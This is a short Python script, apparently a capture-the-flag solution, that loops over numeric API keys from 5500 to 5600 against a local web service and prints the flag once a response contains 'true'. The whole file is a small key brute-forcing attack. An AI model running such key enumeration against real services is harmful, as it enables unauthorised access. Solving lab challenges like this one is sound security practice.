import re
import urllib.request

num = 5500
header = {
	'x-api-key': num
}

flag = ""
for num in range(num, 5601):
	header['x-api-key'] = num
	req = urllib.request.Request('http://127.0.0.1:8082', headers=header)
	res = urllib.request.urlopen(req)
	html = res.read()
	if "true" in str(html):
		pat = 'flag":"(.*)"'		
		flag = re.findall(pat, str(html))[0]
		break

print(flag)